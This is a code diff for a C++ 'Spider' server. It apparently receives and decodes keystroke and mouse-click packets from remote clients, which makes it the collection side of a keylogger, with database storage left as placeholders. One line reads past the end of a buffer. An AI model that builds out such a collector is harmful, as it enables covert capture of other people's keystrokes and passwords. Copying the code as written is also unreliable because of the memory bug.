@@ -2,8 +2,11 @@
 
 #include <functional>
 #include <algorithm>
+#include <MouseClick.hpp>
 
 #include "HandshakeResult.hpp"
+#include "MouseClick.hpp"
+#include "KeyStroke.hpp"
 #include "Network.hpp"
 #include "AFactory.hpp"
 
@@ -53,24 +56,21 @@ void Spider::doHandshake(size_t size)
       else
       {
           std::vector<uint8_t> resp = HandshakeResult(0).to_bytes();
-          _write.insert(_write.begin(), resp.begin(), resp.end());
+          _write.insert(_write.end(), resp.begin(), resp.end());
           _socket->async_write(_write, [this, self](size_t csize){onWrite(csize);});
           std::cout << "Wrong protocol version." << std::endl;
       }
   }
   else if (size == 1)
   {
-      char tmp[2];
-      tmp[0] = _read[0];
-      tmp[1] = '\0';
       if (_read[0] != '\0') {
-          _identity += tmp;
+          _identity += std::string({static_cast<char>(_read[0])});
           _socket->async_read(_read, 1, [this, self](size_t csize){doHandshake(csize);});
       }
       else {
           _network.registerSpider(self);
           std::vector<uint8_t> resp = HandshakeResult(1).to_bytes();
-          _write.insert(_write.begin(), resp.begin(), resp.end());
+          _write.insert(_write.end(), resp.begin(), resp.end());
           write();
           read(1);
       }
@@ -103,11 +103,57 @@ void    Spider::write()
 
 void	Spider::onRead(size_t size)
 {
-    (void)size;
-/*    std::cout << "onRead(" << size << ") " << static_cast<const unsigned char*>(_read.data()) << std::endl;
+  auto self(shared_from_this());
+  if (size == 1)
+  {
+      uint8_t cmdId = _read[0];
 
-    _write.insert(_write.end(), _read.begin(), _read.begin() + size);
-    write();*/
+      switch (static_cast<APacket::PacketType>(cmdId))
+      {
+          case APacket::PacketType::KEYSTROKES:
+              _socket->async_read(_read, 10, [this, self](size_t csize)
+              {
+                  std::vector<uint8_t> tmp;
+
+                  tmp.push_back(static_cast<uint8_t>(APacket::PacketType::KEYSTROKES));
+                  tmp.insert(tmp.end(), _read.begin(), _read.begin() + csize);
+                  uint16_t textSize = 0;
+                  for (size_t i = 0; i < sizeof(textSize); ++i)
+                      textSize = ((textSize << 8) | tmp[8 + i]);
+                  _socket->async_read(_read, textSize, [this, self, tmp](size_t dasize)
+                  {
+                      std::vector<uint8_t> tmp2;
+                      KeyStroke ks;
+
+                      tmp2.insert(tmp2.end(), tmp.begin(), tmp.end());
+                      tmp2.insert(tmp2.end(), _read.begin(), _read.end() + dasize);
+                      ks.from_bytes(tmp2);
+
+
+                      //put in db here
+
+                      read(1);
+                  });
+              });
+              break;
+          case APacket::PacketType::MOUSECLICK:
+              _socket->async_read(_read, 13, [this, self](size_t csize)
+              {
+                  std::vector<uint8_t> tmp;
+                  MouseClick mc;
+                  tmp.push_back(static_cast<uint8_t>(APacket::PacketType::MOUSECLICK));
+                  tmp.insert(tmp.end(), _read.begin(), _read.begin() + csize);
+                  mc.from_bytes(tmp);
+
+                  //put in db here
+
+                  read(1);
+              });
+              break;
+          default:
+              break;
+      }
+  }
 }
 
 void	Spider::onWrite(size_t size)
